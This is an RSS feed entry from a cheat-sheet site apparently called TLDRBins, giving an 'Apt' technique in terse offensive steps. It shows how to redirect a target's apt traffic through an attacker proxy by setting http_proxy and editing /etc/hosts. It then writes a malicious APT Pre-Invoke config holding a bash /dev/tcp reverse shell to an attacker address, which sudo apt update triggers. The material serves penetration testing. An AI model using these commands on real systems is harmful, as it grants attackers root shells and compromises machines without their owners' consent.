channel.title: Pre-Invoke on TLDRBins
channel.description: Recent content in Pre-Invoke on TLDRBins

item.title: Apt
item.description: MITM (Man-in-the-Middle) 1. Add proxy path in target machine export http_proxy=http://<LOCAL_IP>:<LOCAL_PROXY_PORT> 2. Start proxy in local machine # Tool pip3 install --upgrade proxy.py # Start a proxy server proxy --hostname 0.0.0.0 --port <LOCAL_PROXY_PORT> 3. Redirect traffic to our server # Edit /etc/hosts <LOCAL_IP> apt.update.example.com SUDO # Create a malicious config echo 'APT::Update::Pre-Invoke {"bash -c '\''bash -i >& /dev/tcp/<LOCAL_IP>/<LOCAL_PORT> 0>&1'\''"}' > /etc/apt/apt.conf.d/evil # Exploit sudo apt update -y
